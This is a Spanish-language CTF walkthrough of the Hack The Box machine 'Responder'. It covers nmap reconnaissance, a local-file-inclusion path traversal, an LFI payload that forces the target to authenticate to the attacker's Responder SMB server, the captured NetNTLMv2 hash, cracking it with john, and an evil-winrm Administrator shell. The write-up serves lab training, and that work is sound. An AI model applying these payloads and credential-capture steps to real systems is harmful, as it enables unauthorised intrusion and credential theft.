---
title: Responder HTB walkthrough
published: true
---

# Responder HTB walkthrough

En este artículo trataremos la resolucion de la máquina responder de Hack the Box.

## Fase de reconocimiento

En primer lugar lanzamos un ping para comprobar que la máquina se encuentre activa. En base al ttl, podemos sospechar que se trata de una máquina Windows.

Pasamos a buscar puertos abiertos (parámetros tratados en un post anterior):

```
$sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.152.36 -vvv
```

Obteniendo:

```
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
```

Procedemos entonces a lanzar un escaneo más exhaustivo sobre dichos puertos:

```
$sudo nmap -p80,5985 -sCV 10.129.152.36 -vvv
```

Obteniendo:

```
PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: Unika
5985/tcp open  http    syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Tras investigar, encontramos que el servicio wsman nos permite la ejecución remota de comandos de PowerShell en un windows server. De este modo, necesitaremos credenciales para conectarnos.

### Viendo la página web

Si tratamos de acceder a la página web poniendo la ip, no veremos nada, ya que se nos aplicará una redirección a *unika.htb*, por lo que deberemos incluir dicho host en el `/etc/hosts`. En principio, la página no contiene nada fuera de lo normal, sin embargo, al cambiar el idioma a francés (FR), la url pasa a ser:

```
http://unika.htb/index.php?page=french.html
```

Lo que nos da a entender que carga un archivo que toma como parámetro desde la url. Esto, en caso de no estar correctamente sanitizado podría ser vulnerable a un LFI (local file inclusion). Podemos intentar listar algún archivo sensible como el */windows/system32/drivers/etc/hosts*, utilizando varias veces `../` para llegar a la raíz:

```
../../../../../../../../windows/system32/drivers/etc/hosts
```

Consiguiendo listarlo y confirmando la vulnerabilidad.

## Entrando a la máquina

Como la nmáquina es sensible a LFI, podemos utilizar algún servicio como *smb* para que Windows trate de autenticarse en nuestra máquina y robarle el *NetNTLMv2*. En resumen, aunque es llamado un hash sin serlo, es un método de autenticación mediante el cuál podemos obtener credenciales de la máquina.

Para recibir la conexión, utilizaremos una utilidad llamada *Responder* para montar un servidor *smb* malicioso. Primero debemos clonar el repositorio:

```
$git clone https://github.com/lgandx/Responder
```

Y tras verificar que el servidor smb esté seleccionado:

```
$cat Responder.conf
[Responder Core]

; Servers to start
SQL = On
SMB = On
```

Lo arrancamos especificando la interfaz con -I:

```
$sudo python3 Responder.py -I tun0
```

Ahora simplemente hacemos que la máquina victima acceda a un recurso compartido, con una url como:

```
http://unika.htb/index.php?page=//10.10.16.53/whatever
```

Y veremos una captura en el responder como:

```python
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.152.36
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:95e8bb7eb7459971:0ED9F5E29E34D917E8DE63A17AE99FF0:0101000000000000006C01B13436D90110363AC66030E9380000000002000800380038003600470001001E00570049004E002D0052004C005600310035004D004B00550030004600460004003400570049004E002D0052004C005600310035004D004B0055003000460046002E0038003800360047002E004C004F00430041004C000300140038003800360047002E004C004F00430041004C000500140038003800360047002E004C004F00430041004C0007000800006C01B13436D901060004000200000008003000300000000000000001000000002000002DFF7397C3735DFCF58FC37BA1EDC85966D66EC48C74BD1E15017FA0F022AD320A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00350033000000000000000000
```

### Crackeando el hash

Ahora, con el hash guardado en *hash.txt*, utilizaremos *john the ripper* para crackear el hash. Lanzamos la utilidad con el diccionario *rockyou.txt*:

```
$john -w=rockyou.txt hash.txt
```

Obteniendo:

```java
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2023-02-01 13:35) 2.702g/s 11070p/s 11070c/s 11070C/s adriano..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

### Evil-WinRM

Una vez tenemos las credenciales del usuario administrador, solo queda conectarnos mediante *evil-winrm*:

```
$sudo evil-winrm -i 10.129.152.36 -u Administrator -p badminton

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Y ya estaríamos dentro. La flag está en `C:\Users\mike\desktop`, podemos verla con *type*. Enhorabuena! Ya tendríamos la flag!